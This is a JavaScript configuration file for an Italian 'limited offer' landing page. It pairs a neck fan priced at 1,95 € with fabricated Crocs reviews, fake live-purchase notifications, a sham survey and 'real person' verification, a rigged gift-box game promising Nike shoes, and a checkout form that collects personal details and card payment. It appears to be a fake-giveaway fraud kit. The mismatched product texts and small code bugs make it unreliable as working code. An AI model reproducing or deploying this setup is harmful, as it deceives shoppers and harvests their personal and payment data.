const orderHref = window.__order_href;
const orderOriginParam = window.__origin_param;

const baseUrl = document.querySelector("base[href]")?.href;
const baseHref = window.location.protocol + '//' + window.location.host;

const landingUrl = baseHref + window.location.pathname;
const imageBase = baseUrl ?? landingUrl;

(function (exp) {
  const countryCode = "it";
  const lang = "it-IT";
  const locale = lang;

  const sizes = {
    enabled: true,
    selectText: "TAGLIA: ",
    arr: [
      "EU 36",
      "EU 37",
      "EU 37.5",
      "EU 38",
      "EU 38.5",
      "EU 39",
      "EU 39.5",
      "EU 40",
      "EU 40.5",
      "EU 41",
      "EU 41.5",
      "EU 42",
      "EU 42.5",
      "EU 43",
      "EU 43.5",
      "EU 44",
      "EU 44.5",
      "EU 45",
      "EU 45.5",
      "EU 46",
      "EU 46.5",
      "EU 47",
      "EU 47.5",
      "EU 48",
      "EU 49",
      "EU 50",
      "EU 51",
      "EU 52",
    ]
  };

  const bottomRow = {
    bar: "menu",
    account: "Accedi",
    heart: "Lista dei desideri",
    bag: "Carrello",
    find: "Cerca"
  };

  const mainProduct = {
    header: "Offerta limitata",
    name: "Ventilatore da collo",
    oldPrice: "29,99 €",
    newPrice: "1,95 €",
    selectText: "COLORE: ",
    text: `Approfitta di una vestibilità personalizzata, resistente all'acqua e con ventilazione per una migliore traspirabilità. I Crocs Classic
          sono le scarpe perfette per tutte le occasioni. Completamente modellate in materiale Croslite™.
<br></br>
          Incredibilmente leggere e super divertenti da indossare.
  `,
  };

  const notifications = [
    {
      user: "Manuel S*****",
      location: "Roma, Italia",
      action: "Ho appena ricevuto i Clogs per 1,95 euro!",
      timeago: "15 secondi fa",
    },
    {
      user: "Carlos B******",
      location: "Milano, Italia",
      action: "Ho appena ricevuto i Clogs per 1,95 euro!",
      timeago: "25 secondi fa",
    },
  ];

  const reviewsArr = [
    {
      name: "Mateo",
      time: "1 giorno fa",
      header: "È incredibile!",
      product: "26468781",
      review: "“Adoro i miei Crocs Classic Clogs! Sono incredibilmente comodi e perfetti per camminare e fare giardinaggio. Leggeri e facili da pulire 😊",
      image: "./index_files/review1.jpg",
    },
    {
      name: "Lucas",
      time: "2 giorni fa",
      header: "Fantastico! Non ho parole.",
      product: "26468783",
      review: "Ho comprato i Crocs per la spiaggia, ma ora li indosso tutti i giorni. Comodi, non irritano e i piedi non sudano. Ottima scelta",
      image: "./index_files/review2.jpg",
    },
    {
      name: "Valentina",
      time: "2 giorni fa",
      header: "Semplicemente fantastico.",
      product: "26468782",
      review: "Mia figlia adora i Crocs con i Jibbitz colorati. Non solo sono carini, ma anche comodi. Adatti per la scuola e le gite.",
      image: "./index_files/review3.jpg",
    },
    {
      name: "Santiago",
      time: "4 giorni fa",
      header: "Mi piace",
      product: "26468782",
      review: "All'inizio ero scettico, ma dopo il primo utilizzo ho capito perché piacciono tanto a tutti. Incredibilmente comodi e leggeri. Ottimo acquisto!",
      image: "./index_files/review4.jpg",
    },
    {
      name: "Martina",
      time: "7 giorni fa",
      header: "Wow, adoro questo prodotto!",
      product: "26468783",
      review: "Adoro i Crocs! Sono così morbidi e comodi che posso indossarli tutto il giorno senza stancarmi. Ideali per i viaggi e le lunghe passeggiate. Li consiglio a tutti!",
      image: "./index_files/review5.jpg",
    },
  ];

  const reviews = {
    reviews: reviewsArr,
    rr: "RECENSIONI E CRITICHE",
    percent: "99%",
    rec: "Commenti su questa promozione",
  };

  const questions = {
    _of: "Domanda {1} di {2}: ",
    arr: [
      {
        q: "Hai mai utilizzato i nostri prodotti?",
        a: [
          "Sì, compro spesso",
          "Sì, compro raramente",
          "Non ho mai comprato",
        ],
      },
      {
        q: "Ci consiglieresti ai tuoi amici?",
        a: ["Sì, assolutamente!", "Sì, ma cambiate il design dei crocs.", "No"],
      },
      {
        q: "Quale colore di Crocs è il più popolare quest'anno?",
        a: ["Nero", "Verde", "Bianco", "Rosso"],
      },
    ],
  };

  const check = {
    title: "La tua risposta sarà verificata...",
    arr: [
      "Hai risposto alla domanda 3/3.",
      "Il tuo indirizzo IP non consente di trarre conclusioni sugli ordini precedenti.",
      "La tua risposta è stata verificata.",
    ],
  };

  const modals = {
    welcome: {
      texts: {
        header: "Congratulazioni, hai confermato di essere una persona reale",
        button: "OK",
        text: `
        <center>
       Oggi, {date}, hai la possibilità di acquistare un paio di scarpe Nike Air Force 1'07 a un prezzo speciale
          <br><br>
         Tutto ciò che devi fare è scegliere la scatola regalo giusta.
          <br><br>
      Hai 3 tentativi, buona fortuna!
        </center>
      `,
      },
    },
    first: {
      texts: {
        header: "Oh no...",
        button: "OK",
        text: `
        <center>
    Sfortunatamente, questo regalo è vuoto! Hai ancora 2 tentativi - buona fortuna!
        </center>
      `,
      },
    },
    win: {
      texts: {
        header: "Congratulazioni! Hai vinto!",
        button: "OK",
        text: `
        <center>
          <p style="color: #000">
       Hai vinto un paio di scarpe "Nike Air Force 1'07"
          </p>
          <br>
            1) Clicca su "OK" per andare alla pagina di consegna.
            <br><br>
            2) Compila il modulo e paga l'ordine utilizzando il tuo sconto personale.
            <br><br>
            3) Il pacco sarà consegnato in 2-3 giorni.
        </center>
      `,
      },
    },
  };

  const cartSteps = {
    personal: {
      title: "Informazioni personali",
      fields: {
        name: {
          enabled: true,
          field: "Nome",
        },
        family: {
          enabled: true,
          field: "Cognome",
        },
        phone: {
          enabled: true,
          field: "Numero di telefono",
        },
        email: {
          enabled: true,
          field: "Indirizzo email",
        },
      },
    },
    delivery: {
      title: "Consegna",
      fields: {
        city: {
          enabled: true,
          field: "Città",
        },
        address: {
          enabled: true,
          field: "Indirizzo di consegna",
        },
        zip: {
          enabled: true,
          field: "CAP",
        },
      },
    },
    payment: {
      title: "Metodi di pagamento",
      creditCard: "Pagamento online con carta di credito",
    },
  };

  const cart = {
    steps: cartSteps,
    main: {
      title: "Dettagli dell'ordine",
      oldPrice: "29,99 €",
      newPrice: "1,95 €",
      size: "Taglia",
      subTotal: {
        title: "Subtotale",
        amount: "1,95 €",
      },
      delivery: {
        title: "Consegna",
        amount: "0,00 €",
      },
      total: {
        title: "Totale",
        amount: "1,95 €",
      },
      checkoutButton: "Paga il tuo ordine",
    },
  };




  const products = [
    {
      id: "26468781",
      name: "Bianco",
      miniImg: "./assets/fan-img/color-1.jpg",
      images: [
        "./assets/fan-img/color-1.jpg"
      ],
    },
    {
      id: "26468782",
      name: "Blu",
      miniImg: "./assets/fan-img/color-2.jpg",
      images: [
        "./assets/fan-img/color-2.jpg"
      ],
    },
    {
      id: "26468783",
      name: "Verde",
      miniImg: "./assets/fan-img/color-3.jpg",
      images: [
        "./assets/fan-img/color-3.jpg"
      ],
    }
  ];

  const footer = {
    cr: "© 2024, Ubuyee.",
  };

  const pathImgBox = {
    lid: "./assets/box-lid.png",
    lidIOs: "./assets/box-lid-ios.png",
    inner: "./assets/box-inner.png",
    innerGift: "./assets/box-inner-gift.png",
    box: "./assets/box.png",
    boxModal: "./assets/box-modal.png",
  };

  exp.__config = {
    pathImgBox,
    countryCode,
    lang,
    locale,
    mainProduct,
    footer,
    check,
    questions,
    modals,
    cart,
    reviews,
    products,
    sizes,
    notifications,
    bottomRow
  };
})(window);

window.addEventListener("load", () => {
  for (let path of Object.values(window.__config.pathImgBox)) {
    let link = document.createElement("link");
    link.setAttribute("as", "image");
    link.setAttribute("href", path);
    link.rel = "preload";
    document.head.appendChild(link);
  }
});

const lsSelectProduct = (val) => {
  localStorage.setItem("__selected_product", val);
  console.log(val);
};
const lsGetSelectedProduct = () => {
  const products = window.__config.products;
  let ind = localStorage.getItem("__selected_product");

  if (ind == null) {
    ind = products[0].id;
    lsSelectProduct(ind);
  }
  const product = products.find((pr) => pr.name === ind);
  const mainProduct = window.__config.mainProduct;

  const localImageUrl = product.images[0].replace("./", "");
  const imageUrl = imageBase + localImageUrl;

  document.querySelector("input[name='product_name']").value = `${mainProduct.name}: ${product.name}`;
  document.querySelector("input[name='product_image']").value = imageUrl;

  return product;
};
const lsGetSelectedProductInd = () => {
  return lsGetSelectedProduct().id;
};

const lsSelectSize = (val) =>
  localStorage.setItem("__selected_size", val);
const lsGetSelectedSizeInd = () => {
  const ind = localStorage.getItem("__selected_size");
  let v = parseInt(ind);

  if (isNaN(v)) {
    v = 0;
    lsSelectSize(v);
  }

  return v;
};
const lsGetSelectedSize = () => {
  const sizes = window.__config.sizes;
  const selectedSize = sizes.arr?.[lsGetSelectedSizeInd()];
  document.querySelector("input[name='product_size']").value = selectedSize;

  return selectedSize;
};

const lsGetProductImages = () => {
  return lsGetSelectedProduct()?.images ?? [];
};

const lsSetStep = (val) => localStorage.setItem("__step", val);
const lsGetStep = () => {
  const step = localStorage.getItem("__step", val);

  console.log(step);

  if (step != null) return step;

  lsSetStep("main");
  return "main";
};

const getProductById = (id) => {
  const products = window.__config.products;

  return products.find((pr) => pr.id === id);
};

const enableLoader = () => {
  const loader = document.querySelector(".loader");
  loader.setAttribute("style", "display: flex");
};
const disableLoader = () => {
  const loader = document.querySelector(".loader");
  loader.setAttribute("style", "display: none");
};

const openMain = () => {
  document.querySelector("#main").setAttribute("style", "display: block");
};
const closeMain = () => {
  document.querySelector("#main").setAttribute("style", "display: none");
};

const openGame = () => {
  document.querySelector("#game").setAttribute("style", "display: block");
};
const closeGame = () => {
  document.querySelector("#game").setAttribute("style", "display: none");
};

const openCheckout = () => {
  document.querySelector("#checkout").setAttribute("style", "display: block");
};
const closeCheckout = () => {
  document.querySelector("#checkout").setAttribute("style", "display: none");
};

document.querySelector("form").addEventListener("submit", (e) => {
  document.querySelector("#submitButton").setAttribute("disabled", "true");
  const spinner = document.createElement("div");
  spinner.classList.add("spinner__", "submitButton");
  document.querySelector("#submitButton").appendChild(spinner);
});
